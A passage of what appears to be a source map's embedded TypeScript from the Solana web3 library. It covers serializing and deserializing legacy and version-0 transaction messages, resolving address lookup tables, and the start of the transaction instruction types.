// Implies that `deleteCount` was supplied\n      ? start + (args[1] ?? 0) > byteArray.length\n      : start >= byteArray.length\n  ) {\n    throw new Error(END_OF_BUFFER_ERROR_MESSAGE);\n  }\n  return byteArray.splice(\n    ...(args as Parameters<typeof Array.prototype.splice>),\n  );\n}\n","import bs58 from 'bs58';\nimport {Buffer} from 'buffer';\nimport * as BufferLayout from '@solana/buffer-layout';\n\nimport {PublicKey, PUBLIC_KEY_LENGTH} from '../publickey';\nimport type {Blockhash} from '../blockhash';\nimport * as Layout from '../layout';\nimport {PACKET_DATA_SIZE, VERSION_PREFIX_MASK} from '../transaction/constants';\nimport * as shortvec from '../utils/shortvec-encoding';\nimport {toBuffer} from '../utils/to-buffer';\nimport {\n  MessageHeader,\n  MessageAddressTableLookup,\n  MessageCompiledInstruction,\n} from './index';\nimport {TransactionInstruction} from '../transaction';\nimport {CompiledKeys} from './compiled-keys';\nimport {MessageAccountKeys} from './account-keys';\nimport {guardedShift, guardedSplice} from '../utils/guarded-array-utils';\n\n/**\n * An instruction to execute by a program\n *\n * @property {number} programIdIndex\n * @property {number[]} accounts\n * @property {string} data\n */\nexport type CompiledInstruction = {\n  /** Index into the transaction keys array indicating the program account that executes this instruction */\n  programIdIndex: number;\n  /** Ordered indices into the transaction keys array indicating which accounts to pass to the program */\n  accounts: number[];\n  /** The program input data encoded as base 58 */\n  data: string;\n};\n\n/**\n * Message constructor arguments\n */\nexport type MessageArgs = {\n  /** The message header, identifying signed and read-only `accountKeys` */\n  header: MessageHeader;\n  /** All the account keys used by this transaction */\n  accountKeys: string[] | PublicKey[];\n  /** The hash of a recent ledger block */\n  recentBlockhash: Blockhash;\n  /** Instructions that will be executed in sequence and committed in one atomic transaction if all succeed. */\n  instructions: CompiledInstruction[];\n};\n\nexport type CompileLegacyArgs = {\n  payerKey: PublicKey;\n  instructions: Array<TransactionInstruction>;\n  recentBlockhash: Blockhash;\n};\n\n/**\n * List of instructions to be processed atomically\n */\nexport class Message {\n  header: MessageHeader;\n  accountKeys: PublicKey[];\n  recentBlockhash: Blockhash;\n  instructions: CompiledInstruction[];\n\n  private indexToProgramIds: Map<number, PublicKey> = new Map<\n    number,\n    PublicKey\n  >();\n\n  constructor(args: MessageArgs) {\n    this.header = args.header;\n    this.accountKeys = args.accountKeys.map(account => new PublicKey(account));\n    this.recentBlockhash = args.recentBlockhash;\n    this.instructions = args.instructions;\n    this.instructions.forEach(ix =>\n      this.indexToProgramIds.set(\n        ix.programIdIndex,\n        this.accountKeys[ix.programIdIndex],\n      ),\n    );\n  }\n\n  get version(): 'legacy' {\n    return 'legacy';\n  }\n\n  get staticAccountKeys(): Array<PublicKey> {\n    return this.accountKeys;\n  }\n\n  get compiledInstructions(): Array<MessageCompiledInstruction> {\n    return this.instructions.map(\n      (ix): MessageCompiledInstruction => ({\n        programIdIndex: ix.programIdIndex,\n        accountKeyIndexes: ix.accounts,\n        data: bs58.decode(ix.data),\n      }),\n    );\n  }\n\n  get addressTableLookups(): Array<MessageAddressTableLookup> {\n    return [];\n  }\n\n  getAccountKeys(): MessageAccountKeys {\n    return new MessageAccountKeys(this.staticAccountKeys);\n  }\n\n  static compile(args: CompileLegacyArgs): Message {\n    const compiledKeys = CompiledKeys.compile(args.instructions, args.payerKey);\n    const [header, staticAccountKeys] = compiledKeys.getMessageComponents();\n    const accountKeys = new MessageAccountKeys(staticAccountKeys);\n    const instructions = accountKeys.compileInstructions(args.instructions).map(\n      (ix: MessageCompiledInstruction): CompiledInstruction => ({\n        programIdIndex: ix.programIdIndex,\n        accounts: ix.accountKeyIndexes,\n        data: bs58.encode(ix.data),\n      }),\n    );\n    return new Message({\n      header,\n      accountKeys: staticAccountKeys,\n      recentBlockhash: args.recentBlockhash,\n      instructions,\n    });\n  }\n\n  isAccountSigner(index: number): boolean {\n    return index < this.header.numRequiredSignatures;\n  }\n\n  isAccountWritable(index: number): boolean {\n    const numSignedAccounts = this.header.numRequiredSignatures;\n    if (index >= this.header.numRequiredSignatures) {\n      const unsignedAccountIndex = index - numSignedAccounts;\n      const numUnsignedAccounts = this.accountKeys.length - numSignedAccounts;\n      const numWritableUnsignedAccounts =\n        numUnsignedAccounts - this.header.numReadonlyUnsignedAccounts;\n      return unsignedAccountIndex < numWritableUnsignedAccounts;\n    } else {\n      const numWritableSignedAccounts =\n        numSignedAccounts - this.header.numReadonlySignedAccounts;\n      return index < numWritableSignedAccounts;\n    }\n  }\n\n  isProgramId(index: number): boolean {\n    return this.indexToProgramIds.has(index);\n  }\n\n  programIds(): PublicKey[] {\n    return [...this.indexToProgramIds.values()];\n  }\n\n  nonProgramIds(): PublicKey[] {\n    return this.accountKeys.filter((_, index) => !this.isProgramId(index));\n  }\n\n  serialize(): Buffer {\n    const numKeys = this.accountKeys.length;\n\n    let keyCount: number[] = [];\n    shortvec.encodeLength(keyCount, numKeys);\n\n    const instructions = this.instructions.map(instruction => {\n      const {accounts, programIdIndex} = instruction;\n      const data = Array.from(bs58.decode(instruction.data));\n\n      let keyIndicesCount: number[] = [];\n      shortvec.encodeLength(keyIndicesCount, accounts.length);\n\n      let dataCount: number[] = [];\n      shortvec.encodeLength(dataCount, data.length);\n\n      return {\n        programIdIndex,\n        keyIndicesCount: Buffer.from(keyIndicesCount),\n        keyIndices: accounts,\n        dataLength: Buffer.from(dataCount),\n        data,\n      };\n    });\n\n    let instructionCount: number[] = [];\n    shortvec.encodeLength(instructionCount, instructions.length);\n    let instructionBuffer = Buffer.alloc(PACKET_DATA_SIZE);\n    Buffer.from(instructionCount).copy(instructionBuffer);\n    let instructionBufferLength = instructionCount.length;\n\n    instructions.forEach(instruction => {\n      const instructionLayout = BufferLayout.struct<\n        Readonly<{\n          data: number[];\n          dataLength: Uint8Array;\n          keyIndices: number[];\n          keyIndicesCount: Uint8Array;\n          programIdIndex: number;\n        }>\n      >([\n        BufferLayout.u8('programIdIndex'),\n\n        BufferLayout.blob(\n          instruction.keyIndicesCount.length,\n          'keyIndicesCount',\n        ),\n        BufferLayout.seq(\n          BufferLayout.u8('keyIndex'),\n          instruction.keyIndices.length,\n          'keyIndices',\n        ),\n        BufferLayout.blob(instruction.dataLength.length, 'dataLength'),\n        BufferLayout.seq(\n          BufferLayout.u8('userdatum'),\n          instruction.data.length,\n          'data',\n        ),\n      ]);\n      const length = instructionLayout.encode(\n        instruction,\n        instructionBuffer,\n        instructionBufferLength,\n      );\n      instructionBufferLength += length;\n    });\n    instructionBuffer = instructionBuffer.slice(0, instructionBufferLength);\n\n    const signDataLayout = BufferLayout.struct<\n      Readonly<{\n        keyCount: Uint8Array;\n        keys: Uint8Array[];\n        numReadonlySignedAccounts: Uint8Array;\n        numReadonlyUnsignedAccounts: Uint8Array;\n        numRequiredSignatures: Uint8Array;\n        recentBlockhash: Uint8Array;\n      }>\n    >([\n      BufferLayout.blob(1, 'numRequiredSignatures'),\n      BufferLayout.blob(1, 'numReadonlySignedAccounts'),\n      BufferLayout.blob(1, 'numReadonlyUnsignedAccounts'),\n      BufferLayout.blob(keyCount.length, 'keyCount'),\n      BufferLayout.seq(Layout.publicKey('key'), numKeys, 'keys'),\n      Layout.publicKey('recentBlockhash'),\n    ]);\n\n    const transaction = {\n      numRequiredSignatures: Buffer.from([this.header.numRequiredSignatures]),\n      numReadonlySignedAccounts: Buffer.from([\n        this.header.numReadonlySignedAccounts,\n      ]),\n      numReadonlyUnsignedAccounts: Buffer.from([\n        this.header.numReadonlyUnsignedAccounts,\n      ]),\n      keyCount: Buffer.from(keyCount),\n      keys: this.accountKeys.map(key => toBuffer(key.toBytes())),\n      recentBlockhash: bs58.decode(this.recentBlockhash),\n    };\n\n    let signData = Buffer.alloc(2048);\n    const length = signDataLayout.encode(transaction, signData);\n    instructionBuffer.copy(signData, length);\n    return signData.slice(0, length + instructionBuffer.length);\n  }\n\n  /**\n   * Decode a compiled message into a Message object.\n   */\n  static from(buffer: Buffer | Uint8Array | Array<number>): Message {\n    // Slice up wire data\n    let byteArray = [...buffer];\n\n    const numRequiredSignatures = guardedShift(byteArray);\n    if (\n      numRequiredSignatures !==\n      (numRequiredSignatures & VERSION_PREFIX_MASK)\n    ) {\n      throw new Error(\n        'Versioned messages must be deserialized with VersionedMessage.deserialize()',\n      );\n    }\n\n    const numReadonlySignedAccounts = guardedShift(byteArray);\n    const numReadonlyUnsignedAccounts = guardedShift(byteArray);\n\n    const accountCount = shortvec.decodeLength(byteArray);\n    let accountKeys = [];\n    for (let i = 0; i < accountCount; i++) {\n      const account = guardedSplice(byteArray, 0, PUBLIC_KEY_LENGTH);\n      accountKeys.push(new PublicKey(Buffer.from(account)));\n    }\n\n    const recentBlockhash = guardedSplice(byteArray, 0, PUBLIC_KEY_LENGTH);\n\n    const instructionCount = shortvec.decodeLength(byteArray);\n    let instructions: CompiledInstruction[] = [];\n    for (let i = 0; i < instructionCount; i++) {\n      const programIdIndex = guardedShift(byteArray);\n      const accountCount = shortvec.decodeLength(byteArray);\n      const accounts = guardedSplice(byteArray, 0, accountCount);\n      const dataLength = shortvec.decodeLength(byteArray);\n      const dataSlice = guardedSplice(byteArray, 0, dataLength);\n      const data = bs58.encode(Buffer.from(dataSlice));\n      instructions.push({\n        programIdIndex,\n        accounts,\n        data,\n      });\n    }\n\n    const messageArgs = {\n      header: {\n        numRequiredSignatures,\n        numReadonlySignedAccounts,\n        numReadonlyUnsignedAccounts,\n      },\n      recentBlockhash: bs58.encode(Buffer.from(recentBlockhash)),\n      accountKeys,\n      instructions,\n    };\n\n    return new Message(messageArgs);\n  }\n}\n","import bs58 from 'bs58';\nimport * as BufferLayout from '@solana/buffer-layout';\n\nimport * as Layout from '../layout';\nimport {Blockhash} from '../blockhash';\nimport {\n  MessageHeader,\n  MessageAddressTableLookup,\n  MessageCompiledInstruction,\n} from './index';\nimport {PublicKey, PUBLIC_KEY_LENGTH} from '../publickey';\nimport * as shortvec from '../utils/shortvec-encoding';\nimport assert from '../utils/assert';\nimport {PACKET_DATA_SIZE, VERSION_PREFIX_MASK} from '../transaction/constants';\nimport {TransactionInstruction} from '../transaction';\nimport {AddressLookupTableAccount} from '../programs';\nimport {CompiledKeys} from './compiled-keys';\nimport {AccountKeysFromLookups, MessageAccountKeys} from './account-keys';\nimport {guardedShift, guardedSplice} from '../utils/guarded-array-utils';\n\n/**\n * Message constructor arguments\n */\nexport type MessageV0Args = {\n  /** The message header, identifying signed and read-only `accountKeys` */\n  header: MessageHeader;\n  /** The static account keys used by this transaction */\n  staticAccountKeys: PublicKey[];\n  /** The hash of a recent ledger block */\n  recentBlockhash: Blockhash;\n  /** Instructions that will be executed in sequence and committed in one atomic transaction if all succeed. */\n  compiledInstructions: MessageCompiledInstruction[];\n  /** Instructions that will be executed in sequence and committed in one atomic transaction if all succeed. */\n  addressTableLookups: MessageAddressTableLookup[];\n};\n\nexport type CompileV0Args = {\n  payerKey: PublicKey;\n  instructions: Array<TransactionInstruction>;\n  recentBlockhash: Blockhash;\n  addressLookupTableAccounts?: Array<AddressLookupTableAccount>;\n};\n\nexport type GetAccountKeysArgs =\n  | {\n      accountKeysFromLookups?: AccountKeysFromLookups | null;\n    }\n  | {\n      addressLookupTableAccounts?: AddressLookupTableAccount[] | null;\n    };\n\nexport class MessageV0 {\n  header: MessageHeader;\n  staticAccountKeys: Array<PublicKey>;\n  recentBlockhash: Blockhash;\n  compiledInstructions: Array<MessageCompiledInstruction>;\n  addressTableLookups: Array<MessageAddressTableLookup>;\n\n  constructor(args: MessageV0Args) {\n    this.header = args.header;\n    this.staticAccountKeys = args.staticAccountKeys;\n    this.recentBlockhash = args.recentBlockhash;\n    this.compiledInstructions = args.compiledInstructions;\n    this.addressTableLookups = args.addressTableLookups;\n  }\n\n  get version(): 0 {\n    return 0;\n  }\n\n  get numAccountKeysFromLookups(): number {\n    let count = 0;\n    for (const lookup of this.addressTableLookups) {\n      count += lookup.readonlyIndexes.length + lookup.writableIndexes.length;\n    }\n    return count;\n  }\n\n  getAccountKeys(args?: GetAccountKeysArgs): MessageAccountKeys {\n    let accountKeysFromLookups: AccountKeysFromLookups | undefined;\n    if (\n      args &&\n      'accountKeysFromLookups' in args &&\n      args.accountKeysFromLookups\n    ) {\n      if (\n        this.numAccountKeysFromLookups !=\n        args.accountKeysFromLookups.writable.length +\n          args.accountKeysFromLookups.readonly.length\n      ) {\n        throw new Error(\n          'Failed to get account keys because of a mismatch in the number of account keys from lookups',\n        );\n      }\n      accountKeysFromLookups = args.accountKeysFromLookups;\n    } else if (\n      args &&\n      'addressLookupTableAccounts' in args &&\n      args.addressLookupTableAccounts\n    ) {\n      accountKeysFromLookups = this.resolveAddressTableLookups(\n        args.addressLookupTableAccounts,\n      );\n    } else if (this.addressTableLookups.length > 0) {\n      throw new Error(\n        'Failed to get account keys because address table lookups were not resolved',\n      );\n    }\n    return new MessageAccountKeys(\n      this.staticAccountKeys,\n      accountKeysFromLookups,\n    );\n  }\n\n  isAccountSigner(index: number): boolean {\n    return index < this.header.numRequiredSignatures;\n  }\n\n  isAccountWritable(index: number): boolean {\n    const numSignedAccounts = this.header.numRequiredSignatures;\n    const numStaticAccountKeys = this.staticAccountKeys.length;\n    if (index >= numStaticAccountKeys) {\n      const lookupAccountKeysIndex = index - numStaticAccountKeys;\n      const numWritableLookupAccountKeys = this.addressTableLookups.reduce(\n        (count, lookup) => count + lookup.writableIndexes.length,\n        0,\n      );\n      return lookupAccountKeysIndex < numWritableLookupAccountKeys;\n    } else if (index >= this.header.numRequiredSignatures) {\n      const unsignedAccountIndex = index - numSignedAccounts;\n      const numUnsignedAccounts = numStaticAccountKeys - numSignedAccounts;\n      const numWritableUnsignedAccounts =\n        numUnsignedAccounts - this.header.numReadonlyUnsignedAccounts;\n      return unsignedAccountIndex < numWritableUnsignedAccounts;\n    } else {\n      const numWritableSignedAccounts =\n        numSignedAccounts - this.header.numReadonlySignedAccounts;\n      return index < numWritableSignedAccounts;\n    }\n  }\n\n  resolveAddressTableLookups(\n    addressLookupTableAccounts: AddressLookupTableAccount[],\n  ): AccountKeysFromLookups {\n    const accountKeysFromLookups: AccountKeysFromLookups = {\n      writable: [],\n      readonly: [],\n    };\n\n    for (const tableLookup of this.addressTableLookups) {\n      const tableAccount = addressLookupTableAccounts.find(account =>\n        account.key.equals(tableLookup.accountKey),\n      );\n      if (!tableAccount) {\n        throw new Error(\n          `Failed to find address lookup table account for table key ${tableLookup.accountKey.toBase58()}`,\n        );\n      }\n\n      for (const index of tableLookup.writableIndexes) {\n        if (index < tableAccount.state.addresses.length) {\n          accountKeysFromLookups.writable.push(\n            tableAccount.state.addresses[index],\n          );\n        } else {\n          throw new Error(\n            `Failed to find address for index ${index} in address lookup table ${tableLookup.accountKey.toBase58()}`,\n          );\n        }\n      }\n\n      for (const index of tableLookup.readonlyIndexes) {\n        if (index < tableAccount.state.addresses.length) {\n          accountKeysFromLookups.readonly.push(\n            tableAccount.state.addresses[index],\n          );\n        } else {\n          throw new Error(\n            `Failed to find address for index ${index} in address lookup table ${tableLookup.accountKey.toBase58()}`,\n          );\n        }\n      }\n    }\n\n    return accountKeysFromLookups;\n  }\n\n  static compile(args: CompileV0Args): MessageV0 {\n    const compiledKeys = CompiledKeys.compile(args.instructions, args.payerKey);\n\n    const addressTableLookups = new Array<MessageAddressTableLookup>();\n    const accountKeysFromLookups: AccountKeysFromLookups = {\n      writable: new Array(),\n      readonly: new Array(),\n    };\n    const lookupTableAccounts = args.addressLookupTableAccounts || [];\n    for (const lookupTable of lookupTableAccounts) {\n      const extractResult = compiledKeys.extractTableLookup(lookupTable);\n      if (extractResult !== undefined) {\n        const [addressTableLookup, {writable, readonly}] = extractResult;\n        addressTableLookups.push(addressTableLookup);\n        accountKeysFromLookups.writable.push(...writable);\n        accountKeysFromLookups.readonly.push(...readonly);\n      }\n    }\n\n    const [header, staticAccountKeys] = compiledKeys.getMessageComponents();\n    const accountKeys = new MessageAccountKeys(\n      staticAccountKeys,\n      accountKeysFromLookups,\n    );\n    const compiledInstructions = accountKeys.compileInstructions(\n      args.instructions,\n    );\n    return new MessageV0({\n      header,\n      staticAccountKeys,\n      recentBlockhash: args.recentBlockhash,\n      compiledInstructions,\n      addressTableLookups,\n    });\n  }\n\n  serialize(): Uint8Array {\n    const encodedStaticAccountKeysLength = Array<number>();\n    shortvec.encodeLength(\n      encodedStaticAccountKeysLength,\n      this.staticAccountKeys.length,\n    );\n\n    const serializedInstructions = this.serializeInstructions();\n    const encodedInstructionsLength = Array<number>();\n    shortvec.encodeLength(\n      encodedInstructionsLength,\n      this.compiledInstructions.length,\n    );\n\n    const serializedAddressTableLookups = this.serializeAddressTableLookups();\n    const encodedAddressTableLookupsLength = Array<number>();\n    shortvec.encodeLength(\n      encodedAddressTableLookupsLength,\n      this.addressTableLookups.length,\n    );\n\n    const messageLayout = BufferLayout.struct<{\n      prefix: number;\n      header: MessageHeader;\n      staticAccountKeysLength: Uint8Array;\n      staticAccountKeys: Array<Uint8Array>;\n      recentBlockhash: Uint8Array;\n      instructionsLength: Uint8Array;\n      serializedInstructions: Uint8Array;\n      addressTableLookupsLength: Uint8Array;\n      serializedAddressTableLookups: Uint8Array;\n    }>([\n      BufferLayout.u8('prefix'),\n      BufferLayout.struct<MessageHeader>(\n        [\n          BufferLayout.u8('numRequiredSignatures'),\n          BufferLayout.u8('numReadonlySignedAccounts'),\n          BufferLayout.u8('numReadonlyUnsignedAccounts'),\n        ],\n        'header',\n      ),\n      BufferLayout.blob(\n        encodedStaticAccountKeysLength.length,\n        'staticAccountKeysLength',\n      ),\n      BufferLayout.seq(\n        Layout.publicKey(),\n        this.staticAccountKeys.length,\n        'staticAccountKeys',\n      ),\n      Layout.publicKey('recentBlockhash'),\n      BufferLayout.blob(encodedInstructionsLength.length, 'instructionsLength'),\n      BufferLayout.blob(\n        serializedInstructions.length,\n        'serializedInstructions',\n      ),\n      BufferLayout.blob(\n        encodedAddressTableLookupsLength.length,\n        'addressTableLookupsLength',\n      ),\n      BufferLayout.blob(\n        serializedAddressTableLookups.length,\n        'serializedAddressTableLookups',\n      ),\n    ]);\n\n    const serializedMessage = new Uint8Array(PACKET_DATA_SIZE);\n    const MESSAGE_VERSION_0_PREFIX = 1 << 7;\n    const serializedMessageLength = messageLayout.encode(\n      {\n        prefix: MESSAGE_VERSION_0_PREFIX,\n        header: this.header,\n        staticAccountKeysLength: new Uint8Array(encodedStaticAccountKeysLength),\n        staticAccountKeys: this.staticAccountKeys.map(key => key.toBytes()),\n        recentBlockhash: bs58.decode(this.recentBlockhash),\n        instructionsLength: new Uint8Array(encodedInstructionsLength),\n        serializedInstructions,\n        addressTableLookupsLength: new Uint8Array(\n          encodedAddressTableLookupsLength,\n        ),\n        serializedAddressTableLookups,\n      },\n      serializedMessage,\n    );\n    return serializedMessage.slice(0, serializedMessageLength);\n  }\n\n  private serializeInstructions(): Uint8Array {\n    let serializedLength = 0;\n    const serializedInstructions = new Uint8Array(PACKET_DATA_SIZE);\n    for (const instruction of this.compiledInstructions) {\n      const encodedAccountKeyIndexesLength = Array<number>();\n      shortvec.encodeLength(\n        encodedAccountKeyIndexesLength,\n        instruction.accountKeyIndexes.length,\n      );\n\n      const encodedDataLength = Array<number>();\n      shortvec.encodeLength(encodedDataLength, instruction.data.length);\n\n      const instructionLayout = BufferLayout.struct<{\n        programIdIndex: number;\n        encodedAccountKeyIndexesLength: Uint8Array;\n        accountKeyIndexes: number[];\n        encodedDataLength: Uint8Array;\n        data: Uint8Array;\n      }>([\n        BufferLayout.u8('programIdIndex'),\n        BufferLayout.blob(\n          encodedAccountKeyIndexesLength.length,\n          'encodedAccountKeyIndexesLength',\n        ),\n        BufferLayout.seq(\n          BufferLayout.u8(),\n          instruction.accountKeyIndexes.length,\n          'accountKeyIndexes',\n        ),\n        BufferLayout.blob(encodedDataLength.length, 'encodedDataLength'),\n        BufferLayout.blob(instruction.data.length, 'data'),\n      ]);\n\n      serializedLength += instructionLayout.encode(\n        {\n          programIdIndex: instruction.programIdIndex,\n          encodedAccountKeyIndexesLength: new Uint8Array(\n            encodedAccountKeyIndexesLength,\n          ),\n          accountKeyIndexes: instruction.accountKeyIndexes,\n          encodedDataLength: new Uint8Array(encodedDataLength),\n          data: instruction.data,\n        },\n        serializedInstructions,\n        serializedLength,\n      );\n    }\n\n    return serializedInstructions.slice(0, serializedLength);\n  }\n\n  private serializeAddressTableLookups(): Uint8Array {\n    let serializedLength = 0;\n    const serializedAddressTableLookups = new Uint8Array(PACKET_DATA_SIZE);\n    for (const lookup of this.addressTableLookups) {\n      const encodedWritableIndexesLength = Array<number>();\n      shortvec.encodeLength(\n        encodedWritableIndexesLength,\n        lookup.writableIndexes.length,\n      );\n\n      const encodedReadonlyIndexesLength = Array<number>();\n      shortvec.encodeLength(\n        encodedReadonlyIndexesLength,\n        lookup.readonlyIndexes.length,\n      );\n\n      const addressTableLookupLayout = BufferLayout.struct<{\n        accountKey: Uint8Array;\n        encodedWritableIndexesLength: Uint8Array;\n        writableIndexes: number[];\n        encodedReadonlyIndexesLength: Uint8Array;\n        readonlyIndexes: number[];\n      }>([\n        Layout.publicKey('accountKey'),\n        BufferLayout.blob(\n          encodedWritableIndexesLength.length,\n          'encodedWritableIndexesLength',\n        ),\n        BufferLayout.seq(\n          BufferLayout.u8(),\n          lookup.writableIndexes.length,\n          'writableIndexes',\n        ),\n        BufferLayout.blob(\n          encodedReadonlyIndexesLength.length,\n          'encodedReadonlyIndexesLength',\n        ),\n        BufferLayout.seq(\n          BufferLayout.u8(),\n          lookup.readonlyIndexes.length,\n          'readonlyIndexes',\n        ),\n      ]);\n\n      serializedLength += addressTableLookupLayout.encode(\n        {\n          accountKey: lookup.accountKey.toBytes(),\n          encodedWritableIndexesLength: new Uint8Array(\n            encodedWritableIndexesLength,\n          ),\n          writableIndexes: lookup.writableIndexes,\n          encodedReadonlyIndexesLength: new Uint8Array(\n            encodedReadonlyIndexesLength,\n          ),\n          readonlyIndexes: lookup.readonlyIndexes,\n        },\n        serializedAddressTableLookups,\n        serializedLength,\n      );\n    }\n\n    return serializedAddressTableLookups.slice(0, serializedLength);\n  }\n\n  static deserialize(serializedMessage: Uint8Array): MessageV0 {\n    let byteArray = [...serializedMessage];\n\n    const prefix = guardedShift(byteArray);\n    const maskedPrefix = prefix & VERSION_PREFIX_MASK;\n    assert(\n      prefix !== maskedPrefix,\n      `Expected versioned message but received legacy message`,\n    );\n\n    const version = maskedPrefix;\n    assert(\n      version === 0,\n      `Expected versioned message with version 0 but found version ${version}`,\n    );\n\n    const header: MessageHeader = {\n      numRequiredSignatures: guardedShift(byteArray),\n      numReadonlySignedAccounts: guardedShift(byteArray),\n      numReadonlyUnsignedAccounts: guardedShift(byteArray),\n    };\n\n    const staticAccountKeys = [];\n    const staticAccountKeysLength = shortvec.decodeLength(byteArray);\n    for (let i = 0; i < staticAccountKeysLength; i++) {\n      staticAccountKeys.push(\n        new PublicKey(guardedSplice(byteArray, 0, PUBLIC_KEY_LENGTH)),\n      );\n    }\n\n    const recentBlockhash = bs58.encode(\n      guardedSplice(byteArray, 0, PUBLIC_KEY_LENGTH),\n    );\n\n    const instructionCount = shortvec.decodeLength(byteArray);\n    const compiledInstructions: MessageCompiledInstruction[] = [];\n    for (let i = 0; i < instructionCount; i++) {\n      const programIdIndex = guardedShift(byteArray);\n      const accountKeyIndexesLength = shortvec.decodeLength(byteArray);\n      const accountKeyIndexes = guardedSplice(\n        byteArray,\n        0,\n        accountKeyIndexesLength,\n      );\n      const dataLength = shortvec.decodeLength(byteArray);\n      const data = new Uint8Array(guardedSplice(byteArray, 0, dataLength));\n      compiledInstructions.push({\n        programIdIndex,\n        accountKeyIndexes,\n        data,\n      });\n    }\n\n    const addressTableLookupsCount = shortvec.decodeLength(byteArray);\n    const addressTableLookups: MessageAddressTableLookup[] = [];\n    for (let i = 0; i < addressTableLookupsCount; i++) {\n      const accountKey = new PublicKey(\n        guardedSplice(byteArray, 0, PUBLIC_KEY_LENGTH),\n      );\n      const writableIndexesLength = shortvec.decodeLength(byteArray);\n      const writableIndexes = guardedSplice(\n        byteArray,\n        0,\n        writableIndexesLength,\n      );\n      const readonlyIndexesLength = shortvec.decodeLength(byteArray);\n      const readonlyIndexes = guardedSplice(\n        byteArray,\n        0,\n        readonlyIndexesLength,\n      );\n      addressTableLookups.push({\n        accountKey,\n        writableIndexes,\n        readonlyIndexes,\n      });\n    }\n\n    return new MessageV0({\n      header,\n      staticAccountKeys,\n      recentBlockhash,\n      compiledInstructions,\n      addressTableLookups,\n    });\n  }\n}\n","import {VERSION_PREFIX_MASK} from '../transaction/constants';\nimport {Message} from './legacy';\nimport {MessageV0} from './v0';\n\nexport type VersionedMessage = Message | MessageV0;\n// eslint-disable-next-line no-redeclare\nexport const VersionedMessage = {\n  deserializeMessageVersion(serializedMessage: Uint8Array): 'legacy' | number {\n    const prefix = serializedMessage[0];\n    const maskedPrefix = prefix & VERSION_PREFIX_MASK;\n\n    // if the highest bit of the prefix is not set, the message is not versioned\n    if (maskedPrefix === prefix) {\n      return 'legacy';\n    }\n\n    // the lower 7 bits of the prefix indicate the message version\n    return maskedPrefix;\n  },\n\n  deserialize: (serializedMessage: Uint8Array): VersionedMessage => {\n    const version =\n      VersionedMessage.deserializeMessageVersion(serializedMessage);\n    if (version === 'legacy') {\n      return Message.from(serializedMessage);\n    }\n\n    if (version === 0) {\n      return MessageV0.deserialize(serializedMessage);\n    } else {\n      throw new Error(\n        `Transaction message version ${version} deserialization is not supported`,\n      );\n    }\n  },\n};\n","import bs58 from 'bs58';\nimport {Buffer} from 'buffer';\n\nimport {PACKET_DATA_SIZE, SIGNATURE_LENGTH_IN_BYTES} from './constants';\nimport {Connection} from '../connection';\nimport {Message} from '../message';\nimport {PublicKey} from '../publickey';\nimport * as shortvec from '../utils/shortvec-encoding';\nimport {toBuffer} from '../utils/to-buffer';\nimport invariant from '../utils/assert';\nimport type {Signer} from '../keypair';\nimport type {Blockhash} from '../blockhash';\nimport type {CompiledInstruction} from '../message';\nimport {sign, verify} from '../utils/ed25519';\nimport {guardedSplice} from '../utils/guarded-array-utils';\n\n/** @internal */\ntype MessageSignednessErrors = {\n  invalid?: PublicKey[];\n  missing?: PublicKey[];\n};\n\n/**\n * Transaction signature as base-58 encoded string\n */\nexport type TransactionSignature = string;\n\nexport const enum TransactionStatus {\n  BLOCKHEIGHT_EXCEEDED,\n  PROCESSED,\n  TIMED_OUT,\n  NONCE_INVALID,\n}\n\n/**\n * Default (empty) signature\n */\nconst DEFAULT_SIGNATURE = Buffer.alloc(SIGNATURE_LENGTH_IN_BYTES).fill(0);\n\n/**\n * Account metadata used to define instructions\n */\nexport type AccountMeta = {\n  /** An account's public key */\n  pubkey: PublicKey;\n  /** True if an instruction requires a transaction signature matching `pubkey` */\n  isSigner: boolean;\n  /** True if the `pubkey` can be loaded as a read-write account. */\n  isWritable: boolean;\n};\n\n/**\n * List of TransactionInstruction object fields that may be initialized at construction\n */\nexport type TransactionInstructionCtorFields = {\n  keys: Array<AccountMeta>;\n  programId: PublicKey;\n  data?: Buffer;\n};\n\n/**\n * Configuration object for Transaction.serialize()\n */\nexport type SerializeConfig = {\n  /** Require all transaction signatures be present (default: true) */\n  requireAllSignatures?: boolean;\n  /** Verify provided signatures (default: true) */\n  verifySignatures?: boolean;\n};\n\n/**\n * @internal\n */\nexport interface TransactionInstructionJSON {\n  keys: {\n    pubkey: string;\n    isSigner: boolean;\n    isWritable: boolean;\n  }[];\n  programId: string;\n  data: number[];\n}\n\n/**\n * Transaction Instruction class\n */\nexport class TransactionInstruction {\n  /**\n   * Public keys to include in this transaction\n   * Boolean represents whether this pubkey needs to sign the transaction\n   */\n  keys: Array<AccountMeta>;\n\n  /**\n   * Program Id to execute\n   */\n  programId: PublicKey;\n\n  /**\n   * Program input\n   */\n  data: Buffer = Buffer.alloc(0);\n\n  constructor(opts: TransactionInstructionCtorFields) {\n    this.programId = opts.programId;\n    this.keys = opts.keys;\n    if (opts.data) {\n      this.data = opts.data;\n    }\n  }\n\n  /**\n   * @internal\n   */\n  toJSON(): TransactionInstructionJSON {\n    return {\n      keys: this.keys.map(({pubkey, isSigner, isWritable}) => ({\n        pubkey: pubkey.toJSON(),\n        isSigner,\n        isWritable,\n      })),\n      programId: this.programId.toJSON(),\n      data: [...this.data],\n    };\n  }\n}\n\n/**\n * Pair of signature and corresponding public key\n */\nexport type SignaturePubkeyPair = {\n  signature: Buffer | null;\n  publicKey: PublicKey;\n};\n\n/**\n * List of Transaction object fields that may be initialized at construction\n */\nexport type TransactionCtorFields_DEPRECATED = {\n  /** Optional nonce information used for offline nonce'd transactions */\n  nonceInfo?: NonceInformation | null;\n  /** The transaction fee payer */\n  feePayer?: PublicKey | null;\n  /** One or more signatures */\n  signatures?: Array<SignaturePubkeyPair>;\n  /** A recent blockhash */\n  recentBlockhash?: Blockhash;\n};\n\n// For backward compatibility; an unfortunate consequence of being\n// forced to over-export types by the documentation generator.\n// See https://github.com/solana-labs/solana/pull/25820\nexport type TransactionCtorFields = TransactionCtorFields_DEPRECATED;\n\n/**\n * Blockhash-based transactions have a lifetime that are defined by\n * the blockhash they include. Any transaction whose blockhash is\n * too old will be rejected.\n */\nexport type TransactionBlockhashCtor = {\n  /** The transaction fee payer */\n  feePayer?: PublicKey | null;\n  /** One or more signatures */\n  signatures?: Array<SignaturePubkeyPair>;\n  /** A recent blockhash */\n  blockhash: Blockhash;\n  /** the last block chain can advance to before tx is declared expired */\n  lastValidBlockHeight: number;\n};\n\n/**\n * Use these options to construct a durable nonce transaction.\n */\nexport type TransactionNonceCtor = {\n  /** The transaction fee payer */\n  feePayer?: PublicKey | null;\n  